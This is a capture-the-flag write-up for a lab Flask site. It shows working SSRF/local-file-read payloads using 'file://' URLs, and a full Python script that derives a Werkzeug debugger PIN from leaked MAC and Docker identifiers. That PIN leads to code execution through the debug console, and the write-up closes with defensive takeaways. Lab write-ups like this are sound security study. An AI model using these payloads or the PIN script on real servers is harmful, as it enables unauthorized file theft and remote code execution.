# Plant Photographer — Write-up

## Objective

A friend — a botanist and aspiring photographer — built a personal portfolio site from scratch to showcase his rare plant photos:

```
http://10.80.181.6/
```

He asked for a quick review of the site to see if anything could be improved. The goal is to look at how the site works under the hood, assess whether it follows good coding practices, and — if anything looks questionable — dig deeper to uncover the flags hidden behind the scenes.

**Questions to answer:**

- What API key is used to retrieve files from the secure storage service?
- What is the flag in the admin section of the website?
- What flag is stored in a text file in the server's web directory?

---

## Initial Recon

```bash
gobuster dir -w raft-medium-words.txt -u http://10.81.139.115/ -x php,html,txt,py,js
```

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.81.139.115/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                raft-medium-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,py,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 200) [Size: 48]
/download             (Status: 200) [Size: 20]
/console              (Status: 200) [Size: 1985]
```

Three paths of interest: `/admin`, `/download`, and `/console`.

---

## Finding the API Key Flag

Manually checking the HTML source code from the portfolio's download feature turned up the first flag:

```
view-source:http://10.81.139.115/download?server=secure-file-storage.com:8086&id=75482342
```

**Flag:** `THM{Hello_######_key}`

---

## Finding the Admin Flag

Looking at the HTML block where the flag was placed, I found a snippet that could be exploited using a `#` to reach the source file:

```python
crl.setopt(crl.URL, server + '/public-docs-k057230990384293/' + filename)
```

A plain `#` didn't work through the URL, so I URL-encoded it as `%23`. That gave a working payload to read the app's own source via a `file://` wrapper:

```
view-source:http://10.81.139.115//download?server=file:///usr/src/app/app.py%23&id=0
```

This revealed the location of the next flag inside the application code:

```python
@app.route("/admin")
def admin():
    if request.remote_addr == '127.0.0.1':
        return send_from_directory('private-docs', 'flag.pdf')
```

Since the download endpoint could already fetch arbitrary local files, the same trick was used to reach the admin-only PDF directly:

```
view-source:http://10.81.139.115/download?server=file:///usr/src/app/private-docs/flag.pdf%23&id=0
```

**Flag:** `thm{c4n_i_haz_######?}`

---

## Chasing the Werkzeug Console

Nothing further turned up down that path, so I moved on to the last untouched endpoint: `/console`. Some research pointed to a known technique for calculating the Werkzeug debugger PIN from leaked machine identifiers:

- https://blog.1nf1n1ty.team/hacktricks/network-services-pentesting/pentesting-web/werkzeug

I asked an AI to adapt the technique into a script that automates the SSRF recon (using the same `file://` LFI trick from the download endpoint) and derives the PIN automatically:

```python
import hashlib
import requests
import sys
from itertools import chain


def get_file(ip, path):
    url = f"http://{ip}/download"
    params = {
        "server": f"file://{path}#",
        "id": "0"
    }

    r = requests.get(url, params=params, timeout=5)
    return r.text.strip()


def generate_pin(mac, machine_id):

    probably_public_bits = [
        "root",
        "flask.app",
        "Flask",
        "/usr/local/lib/python3.10/site-packages/flask/app.py"
    ]

    private_bits = [
        str(mac),
        machine_id
    ]

    h = hashlib.md5()

    for bit in chain(probably_public_bits, private_bits):
        if bit:
            if isinstance(bit, str):
                bit = bit.encode()
            h.update(bit)

    h.update(b"cookiesalt")

    cookie_name = "__wzd" + h.hexdigest()[:20]

    h.update(b"pinsalt")

    num = ("%09d" % int(h.hexdigest(), 16))[:9]

    rv = None

    for group_size in (5, 4, 3):
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x:x+group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break

    return cookie_name, rv


if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <IP>")
    exit()


ip = sys.argv[1]

print("[+] Gathering variables...")

mac_raw = get_file(ip, "/sys/class/net/eth0/address")
machine_id = get_file(ip, "/proc/self/cgroup")


# Convert MAC format:
# 02:42:ac:14:00:02 -> 2485378088962
mac = int(mac_raw.replace(":", ""), 16)


# Extract docker id from cgroup
if "/docker/" in machine_id:
    machine_id = machine_id.split("/docker/")[1].split("\n")[0]


print(f"[+] MAC: {mac}")
print(f"[+] Machine ID: {machine_id}")


cookie, pin = generate_pin(mac, machine_id)

print("\n========== RESULT ==========")
print(f"Cookie: {cookie}")
print(f"PIN: {pin}")
```

Running the script against the target recovered the console PIN:

**PIN:** `110-###-511`

---

## Recovering the Final Flag

The recovered PIN unlocked the Werkzeug debug console, dropping into a live Python terminal on the server. From there I listed the web directory:

```python
print(os.listdir())
```

This revealed a flag file, `flag-982374827648721338.txt`, which was read directly:

```python
print(open('flag-982374827648721338.txt').read())
```

**Flag:** `THM{SSRF2######_M3}`

---

## Summary

- **Recon:** Gobuster found three endpoints of interest on the portfolio site: `/admin`, `/download`, and `/console`.
- **API key leak:** Viewing the page source behind the site's download feature exposed the API key used to talk to the "secure" file storage service — the first flag.
- **LFI via `file://`:** The `download` endpoint's `server` parameter accepted a `file://` URL. URL-encoding `#` as `%23` let it read the app's own source code (`app.py`), revealing an admin route that serves a file only to requests from `127.0.0.1`.
- **Admin bypass:** Since the download endpoint could already read arbitrary local files server-side, the same LFI trick was reused to pull the admin-only PDF directly off disk — no need to actually spoof the source IP.
- **Werkzeug PIN recovery:** With arbitrary file read via SSRF, the MAC address and Docker machine ID needed to compute the Werkzeug debugger PIN were pulled straight off the server's filesystem and fed into the known PIN-derivation algorithm.
- **RCE via debug console:** The recovered PIN unlocked the exposed `/console` debug shell, giving a live Python REPL used to list the directory and read the final flag file.

**Key takeaways:**

- Never expose the Werkzeug/Flask debug console in anything resembling production — if `app.debug = True` is possible to reach externally, it's effectively unauthenticated RCE once the PIN is known.
- User-controlled URLs passed to a fetch/download function are a classic SSRF vector, and `file://` wrappers turn that into full local file read if not explicitly blocked.
- Restricting a route by `request.remote_addr == '127.0.0.1'` is not a real access control — anything else on the server (like an SSRF-capable endpoint) can be abused to read the "protected" resource anyway.
- Hardcoded or client-visible API keys for backend services should never ship in page source, even for "internal" storage systems.
